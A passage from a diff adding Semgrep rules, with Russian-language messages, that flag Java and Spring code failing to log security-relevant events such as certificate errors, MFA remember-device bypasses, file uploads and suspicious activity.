+    очереди WARN и INFO сообщения будут отбрасываться без записи. Если очередь
+    заполнится в момент атаки (высокая нагрузка), security-события потеряются.
+    Для security-логов используйте discardingThreshold=0 и достаточный queueSize.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-logging-without-mdc-user-context
+  patterns:
+    - pattern-inside: |
+        @PostMapping(...)
+        public $RET $METHOD(...) { ... }
+    - pattern: |
+        log.$LEVEL($MESSAGE, $ARGS);
+    - pattern-not-inside: |
+        MDC.put("userId", ...);
+    - pattern-not-inside: |
+        MDC.put("requestId", ...);
+  message: |
+    Логирование в controller без MDC-контекста (userId, requestId). Без MDC
+    невозможно соотнести лог-сообщения с конкретным пользователем или запросом
+    при расследовании инцидента. Устанавливайте MDC в начале каждого запроса
+    через Filter/Interceptor и очищайте в finally.
+  severity: INFO
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-log-level-change-at-runtime-unprotected
+  patterns:
+    - pattern-either:
+      - pattern: |
+          @PostMapping("/log-level")
+          public $RET changeLogLevel(@RequestParam String $LEVEL) {
+            ...
+            LoggerFactory.getLogger($LOGGER).setLevel(Level.toLevel($LEVEL));
+          }
+      - pattern: |
+          @GetMapping("/actuator/loggers/{name}")
+  message: |
+    Уровень логирования можно изменить без авторизации через endpoint. Атакующий
+    может установить уровень OFF и отключить все security-логи во время атаки.
+    Защитите endpoint изменения уровня логирования аутентификацией и
+    авторизацией (только ADMIN), а также логируйте сам факт изменения.
+  severity: ERROR
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+# Специфические случаи
+
+- id: java-log-first-time-login-no-alert
+  patterns:
+    - pattern-inside: |
+        @PostMapping("/login")
+        public $RET login(...) { ... }
+    - pattern: |
+        if (user.getLastLoginDate() == null) {
+          user.setLastLoginDate(LocalDateTime.now());
+        }
+    - pattern-not-inside: |
+        log.info("First login for user: {}", $USER.getId());
+  message: |
+    Первый вход пользователя не логируется отдельно. Первый вход — важная
+    security baseline: если аккаунт входит первый раз из неожиданной локации,
+    это может быть признаком компрометации. Логируйте первый вход с
+    дополнительным контекстом (IP, device fingerprint, геолокация).
+  severity: INFO
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-no-log-on-cert-validation-error
+  patterns:
+    - pattern-either:
+      - pattern: |
+          } catch (CertificateException $E) {
+          }
+      - pattern: |
+          } catch (SSLHandshakeException $E) {
+            return false;
+          }
+  message: |
+    Ошибка валидации сертификата перехватывается и игнорируется без логирования.
+    SSLHandshakeException может свидетельствовать о MITM-атаке. Логируйте
+    все TLS/certificate ошибки на уровне WARN с указанием хоста, сертификата,
+    причины отказа.
+  severity: ERROR
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-missing-log-on-mfa-bypass
+  patterns:
+    - pattern: |
+        if ($REMEMBER_DEVICE) {
+          session.setAttribute("mfa_verified", true);
+        }
+    - pattern-not-inside: |
+        log.info("MFA bypassed via remember-device for user: {} device: {}", $USER, $DEVICE);
+  message: |
+    Пропуск MFA через "remember this device" не логируется. Если устройство
+    украдено, обойти MFA можно без знания второго фактора. Логируйте каждое
+    использование remember-device с user_id, device fingerprint, IP, timestamp
+    для обнаружения аномалий.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-missing-log-on-file-upload
+  patterns:
+    - pattern-either:
+      - pattern: |
+          @PostMapping("/upload")
+          public $RET upload(@RequestParam MultipartFile $FILE) {
+            ...
+            $FILE.transferTo($DEST);
+          }
+      - pattern: |
+          Files.copy($MULTIPART.getInputStream(), $TARGET_PATH);
+    - pattern-not-inside: |
+        log.info("File uploaded by user: {} filename: {} size: {}", $USER, $FILENAME, $SIZE);
+  message: |
+    Загрузка файла не логируется. File upload — потенциальный вектор атаки
+    (веб-шелл, вредоносный файл). Логируйте: пользователь, имя файла (оригинальное),
+    размер, MIME-тип, hash (SHA-256), IP, timestamp для audit и обнаружения аномалий.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-logging-in-catch-without-context
+  patterns:
+    - pattern: |
+        } catch ($EX $E) {
+          log.error("Error occurred");
+        }
+    - pattern-not-inside: |
+        log.error("Error occurred for user: {} in method: {}", $USER, $METHOD, $E);
+  message: |
+    Исключение логируется без контекста (пользователь, запрос, метод) и без
+    самого объекта исключения. Такое сообщение бесполезно для расследования.
+    Всегда включайте контекст: кто делал, что делал, и передавайте
+    исключение как последний параметр для записи stacktrace.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-missing-log-on-suspicious-activity
+  patterns:
+    - pattern-either:
+      - pattern: |
+          if ($ATTEMPTS > 10) {
+            blockUser($USER_ID);
+          }
+      - pattern: |
+          if (isAnomalousActivity($REQUEST)) {
+            return ResponseEntity.status(403).build();
+          }
+    - pattern-not-inside: |
+        log.warn("Suspicious activity detected for user: {} IP: {}", $USER, $IP);
+  message: |
+    Обнаружение подозрительной активности (блокировка, аномалия) не логируется.
+    Именно эти события наиболее ценны для SIEM: они являются индикаторами атаки.
+    Логируйте с максимальным контекстом (user, IP, action, threshold, count)
+    на уровне WARN для автоматического алертинга.
+  severity: ERROR
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
